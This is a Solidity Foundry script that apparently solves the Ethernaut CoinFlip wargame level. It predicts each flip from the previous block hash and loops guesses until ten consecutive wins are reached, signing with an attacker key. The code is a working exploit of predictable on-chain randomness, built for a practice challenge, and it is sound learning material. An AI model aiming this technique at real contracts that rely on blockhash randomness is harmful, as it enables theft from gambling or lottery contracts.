// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {Attacker} from "../src/Attacker.sol";

// 0xE6F8C231CB47270005fbcebB079d28f17B84835F

contract Guess {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public victim;

    constructor(CoinFlip _victim) {
        victim = _victim;
    }

    function guess() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return victim.flip(side);
    }
}

/// @notice This script only works for one transaction at a time
contract CoinFlipScript is Script, Attacker {
    CoinFlip public coinFlip =
        CoinFlip(payable(0xE6F8C231CB47270005fbcebB079d28f17B8483F5));

    function run() external {
        vm.startBroadcast(me.privateKey);
        uint256 consecutiveWins = coinFlip.consecutiveWins();
        uint256 rounds = 10 - consecutiveWins;

        // vm.broadcast(me.privateKey);
        Guess guess = new Guess(coinFlip);
        for (uint256 i = 0; i < rounds; i++) {
            // vm.broadcast(me.privateKey);
            guess.guess();

            // not working
            // uint256 blockNumber = waitNumBlocks(5, 10000);
            vm.roll(6 + i);
        }
        vm.stopBroadcast();
        console.log("Consecutive wins: ", coinFlip.consecutiveWins());
    }
}
